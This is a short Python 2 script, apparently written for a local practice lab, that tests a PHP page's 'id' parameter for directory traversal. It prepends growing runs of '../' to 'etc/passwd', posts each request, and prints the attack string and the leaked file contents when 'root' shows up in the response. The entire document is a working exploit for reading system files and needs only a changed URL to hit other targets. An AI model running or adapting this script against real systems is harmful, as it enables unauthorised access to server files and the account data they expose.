import requests
import sys
url = "http://127.0.0.1/traversal/third.php?id="
payloads = {'etc/passwd': 'root'}
up = "../"
i = 0
for payload, string in payloads.iteritems():
	while i < 7:
		req = requests.post(url+(i*up)+payload)
		if string in req.text:
			print "Parameter vulnerable\r\n"
			print "Attack string: "+(i*up)+payload+"\r\n"
			print req.text
			break
		i = i+1
	i = 0
